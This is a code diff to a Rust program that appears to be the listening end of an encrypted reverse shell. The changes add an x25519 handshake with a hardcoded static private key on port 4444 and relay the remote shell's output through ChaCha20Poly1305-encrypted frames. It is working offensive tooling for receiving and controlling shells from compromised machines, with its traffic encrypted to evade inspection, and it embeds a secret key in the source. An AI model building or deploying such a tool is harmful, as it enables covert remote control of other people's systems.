@@ -11,6 +11,8 @@ use crossterm::terminal::{disable_raw_mode, enable_raw_mode};
 mod codec;
 use codec::EncryptedCodec;
 
+use rrsh::{do_handshake, HandshakeRole};
+
 struct RawModeGuard;
 
 impl RawModeGuard {
@@ -28,17 +30,21 @@ impl Drop for RawModeGuard {
     }
 }
 
-
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:4444").await?;
+    let server_role = rrsh::HandshakeRole::Server { 
+        my_static_secret: x25519_dalek::StaticSecret::from(
+            [154, 28, 197, 146, 162, 193, 220, 27, 149, 212, 221, 50, 238, 237, 119, 104, 137, 101, 199, 180, 99, 33, 61, 7, 158, 188, 197, 71, 96, 155, 89, 199]
+        )
+    };
     println!("[*] Listening on 0.0.0.0:4444 (Encrypted, Framed, Interactive)...");
 
     loop {
         let (mut socket, addr) = listener.accept().await?;
         println!("[+] New connection from: {}", addr);
 
-        match handle_session(&mut socket).await {
+        match handle_session(&mut socket, server_role.clone()).await {
             Ok(_) => println!("[*] Waiting for next client..."),
             Err(e) => eprintln!("[-] Session Error: {}", e),
         }
@@ -47,10 +53,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 async fn handle_session(
     socket: &mut tokio::net::TcpStream,
+    role: HandshakeRole,
 ) -> Result<(), Box<dyn std::error::Error>> {
     println!("[*] Starting Handshake...");
 
-    let (key_rx, key_tx) = revshell::do_handshake(socket).await?;
+    let (key_rx, key_tx) = do_handshake(socket, role).await?;
 
     let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_rx).unwrap();
     let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_tx).unwrap();
@@ -72,13 +79,10 @@ async fn handle_session(
             Some(result) = frame_reader.next() => {
                 match result {
                     Ok(data) => {
-                        // In raw mode, we must use \r\n for newlines,
-                        // but the remote shell usually handles that.
-                        // Just writing raw bytes is correct here.
                         stdout.write_all(&data).await?;
                         stdout.flush().await?;
                     }
-                    Err(_) => break, // Integrity error or disconnect
+                    Err(e) => return Err(format!("network error: {}", e).into()),
                 }
             }
 
